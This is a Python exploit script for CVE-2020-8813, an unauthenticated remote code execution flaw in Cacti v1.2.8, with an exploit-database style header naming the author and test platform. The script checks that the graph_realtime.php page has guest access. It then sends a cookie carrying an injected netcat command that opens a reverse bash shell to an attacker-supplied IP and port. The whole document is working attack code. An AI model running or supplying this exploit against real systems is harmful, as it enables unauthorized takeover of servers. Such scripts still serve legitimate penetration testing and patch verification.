#!/usr/bin/python3

# Exploit Title: Cacti v1.2.8 Unauthenticated Remote Code Execution
# Date: 03/02/2020
# Exploit Author: Askar (@mohammadaskar2)
# CVE: CVE-2020-8813
# Vendor Homepage: https://cacti.net/
# Version: v1.2.8
# Tested on: CentOS 7.3 / PHP 7.1.33

import requests
import sys
import warnings
from bs4 import BeautifulSoup
from urllib.parse import quote

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')


if len(sys.argv) != 4:
    print("[~] Usage : ./Cacti-exploit.py url ip port")
    exit()

url = sys.argv[1]
ip = sys.argv[2]
port = sys.argv[3]

def send_exploit(url):
    payload = ";nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s" % (ip, port)
    cookies = {'Cacti': quote(payload)}
    path = url+"/graph_realtime.php?action=init"
    req = requests.get(path)
    if req.status_code == 200 and "poller_realtime.php" in req.text:
        print("[+] File Found and Guest is enabled!")
        print("[+] Sending malicous request, check your nc ;)")
        requests.get(path, cookies=cookies)
    else:
        print("[+] Error while requesting the file!")

send_exploit(url)
